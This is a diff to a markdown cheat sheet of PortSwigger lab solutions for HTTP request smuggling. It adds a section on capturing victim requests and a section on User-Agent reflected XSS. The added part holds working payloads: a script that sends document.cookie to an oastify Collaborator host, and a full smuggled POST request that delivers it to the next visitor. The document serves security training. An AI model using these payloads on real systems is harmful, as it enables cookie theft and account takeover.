@@ -115,10 +115,13 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 
 ## HTTP Request Smuggling
 
-### Bypass security controls capture victim requests
 >Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding(HEX) or content-length(Decimal).  Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.
   
-<sub>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **hexadecimal**, and _ _Content-Length_ _ specifies the length of the message body in **bytes**. Chunk consists are followed by a **newline**, followed by the chunk contents. The message is terminated with a chunk of size zero.</sub>  
+<sub>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **hexadecimal**, and _ _Content-Length_ _ specifies the length of the message body in **bytes**. Chunk consists are followed by a **newline**, followed by the chunk contents. The message is terminated with a chunk of size zero.</sub>   
+
+### Content-Lenth POST Capture victim requests
+
+>Sending a POST request with smuggled request but the content length is longer thant the real length and when victim browse their cookie session value is posted to blob comment.  
 
 ```html
 POST / HTTP/1.1
@@ -141,4 +144,47 @@ csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40mail.net&websit
 ![Exploiting HTTP request smuggling to capture other users' requests](request-smuggling-cookie-stealer.PNG)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  
+
+### User-Agent XSS Cookie Stealer smuggler
+
+>Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value in smuggled request.  
+
+<sub>COOKIE STEALER Payload</sub>  
+
+```JavaScript
+a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
+```
+  
+```JavaScript
+ "/><script>alert(1)</script>
+```
+
+>Smuggle this XSS request to the back-end server, so that it exploits the next visitor.
+
+```html
+POST / HTTP/1.1
+Host: 0acc008e03af84c3c0274fe0004e00d4.web-security-academy.net
+Content-Length: 237
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=4 HTTP/1.1
+User-Agent: a"/><script>document.location='http://j0kk3reuzdhg8gslbbcrqwdtnktbh15q.oastify.com/?Hack='+document.cookie;</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+![HTTP request smuggling to deliver reflected XSS and steal victim cookie](user-agent-cookie-stealer-smuggled.PNG)  
+
+>Check the PortSwigger Collaborator Request received from victim browsing target.  
+  
+![Collaborator capture xss Request from victim browsing target](collaborator-xss-Request-received.png)  
+
+
+
+[PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
 
